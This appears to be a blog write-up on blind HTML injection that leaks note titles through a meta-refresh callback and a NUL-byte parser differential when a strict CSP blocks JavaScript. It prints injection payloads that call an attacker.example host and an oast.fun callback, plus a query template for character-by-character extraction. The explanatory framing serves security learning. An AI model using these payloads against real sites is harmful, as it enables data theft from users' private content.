---
title: "When XSS Does Not Need JavaScript"
date: "2026-06-23"
description: "How HTML injection can still be useful when JavaScript is blocked"
tags: ["XSS", "web-security"]
---

## Short intro

Websites often reflect user input, but if it's not correctly sanitized attackers may be able to inject HTML that is interpreted by the browser. For this exploit I used a blind-XSS prefix oracle that exploits the parser disagreement between SQL's LIKE and the HTML parser on null bytes with no JavaScript execution involved at all. 

```text
A parser is a computer program that converts unstructured data or code into a structured format.
```

## Main explanation
When a user uses the search function and the search query does not match any note, the value of the `q` parameter is reflected inside the response without proper HTML encoding.

```HTML
<p>{q} not found</p>
```

The website used a very strict Content Security Policy. The CSP decides which scripts, styles, images, frames and connections a page may load. Because of this strict CSP, JavaScript execution was blocked. I solved it using this payload:

```HTML
<meta
  http-equiv="refresh"
  content="0;url=https://attacker.example/callback"
>
```

When I put this payload in the search bar the website made a request to https://attacker.example/callback. The callback did not directly leak the page content, but it gave me a signal that the injected HTML was rendered. After some testing I figured out that its behavior was comparable to a SQL query using LIKE:

```SQL
SELECT *
FROM notes
WHERE title LIKE '<query>%';
```

When the supplied prefix matched a note title, the application rendered the matching note results.
The vulnerable “not found” output was not rendered.

This difference created a potential oracle:
```JS
Matching prefix     → no vulnerable reflection
Non-matching prefix → injected HTML is rendered
```

The next thing I noticed was a parser differential. That occurs when different parts of the system process the same input differently, creating an exploitable gap.

The key technique was placing a NUL byte between the search pattern and the HTML payload:  
```HTML
<candidate-prefix>%\x00<html-payload>
```

The search logic effectively evaluated the prefix before the injected HTML.
The browser still received and interpreted the HTML located after the NUL byte.

This produced two different outcomes.

If the candidate prefix matched the note title, the vulnerable reflection was not rendered. If it did not match, the HTML payload was rendered and the callback was triggered.

This transformed the vulnerability into a blind prefix oracle.
It was blind because I could not see the victim’s browser directly. I only knew the payload worked when my callback server received a request.

### Oracle Logic
For every possible next character, I generated a search query using the following structure:
```HTML
<known-prefix>candidate%\x00<meta-refresh>
```

To test whether the next character was a, the effective query became:
```HTML
a%00<meta
  http-equiv="refresh"
  content="0;url=https://example.oast.fun/wrong-position-01-a">
```


## What I learned
A strict CSP does not make a website safe and XSS does not always require JavaScript execution. Meta refresh can provide a useful callback primitive in blind scenarios. I also learned that parser differences can turn a simple reflection bug into something much more powerful.